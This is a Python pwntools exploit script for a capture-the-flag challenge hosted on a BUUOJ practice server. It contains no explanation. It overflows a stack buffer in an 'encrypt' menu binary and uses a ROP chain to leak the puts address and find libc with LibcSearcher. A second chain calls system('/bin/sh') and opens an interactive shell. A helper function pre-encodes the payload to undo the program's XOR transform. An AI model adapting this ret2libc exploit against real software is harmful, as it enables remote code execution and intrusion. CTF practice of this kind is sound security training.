#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from LibcSearcher import *


context.log_level = "debug"
# sh = process('./pwn')
sh=remote('node3.buuoj.cn', 28445)
elf = ELF("./pwn")

ret = 0x004006b9

pop_rdi_ret = 0x00400c83
log.info("pop_rdi_ret -> " + hex(pop_rdi_ret))
puts_plt = elf.symbols["puts"]
log.info("puts_plt -> " + hex(puts_plt))
gets_plt = elf.symbols['gets']
log.info("gets_plt -> " + hex(gets_plt))
start_addr = 0x0400790
puts_got = elf.got["puts"]
log.info("puts_got -> " + hex(puts_got))

def enc(payload):
    sh.recvuntil("choice!\n")
    sh.sendline('1')
    sh.recvuntil("encrypted\n")
    sh.sendline(str(payload))
    sh.recvuntil("Ciphertext\n")
    log.success("enc success!!")

def dec(s):
    x = 0
    result = list(s)
    while x < len(s):
        c = ord(s[x])
        if ( c <= 96 or c > 122 ):
            if ( c <= 64 or c > 90 ):
                if ( c > 47 and c <= 57 ):
                    c ^= 0xF
            else:
                c ^= 0xE
        else:
            c ^= 0xD
        result[x] = chr(c)
        x += 1
    result = ''.join(result)
    print result
    return result


payload = 'a' * 0x50 + 'b' * 0x8 
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
payload = dec(payload)

sh.recv()
sh.sendline('1')
sh.recv()
sh.sendline(payload)
sh.recvuntil("\x0c\x40\x0a")
puts_addr = u64(sh.recv(6) + '\x00' * 2)
log.info(hex(puts_addr))

obj = LibcSearcher("puts", int(hex(puts_addr), 16))
system_libc_addr = obj.dump("system")
log.info("system_libc_addr -> " + hex(system_libc_addr))

puts_libc_addr = obj.dump("puts")
log.info("puts_libc_addr -> " + hex(puts_libc_addr))
bin_sh_libc = obj.dump("str_bin_sh")
log.info("bin_sh_libc -> " + hex(bin_sh_libc))

offset = puts_addr - puts_libc_addr
log.success("Offset -> " + hex(offset))

system_addr = system_libc_addr + offset
log.success("system_addr -> " + hex(system_addr))

bin_sh = offset + bin_sh_libc
log.success("bin_sh -> " + hex(bin_sh))

sh.sendline("1")
sh.recv()
payload = 'a' * 0x50 + 'b' * 0x8 
payload += p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr) + p64(start_addr)
# payload = dec(payload)

# gdb.attach(sh)

sh.sendline(payload)

sh.interactive()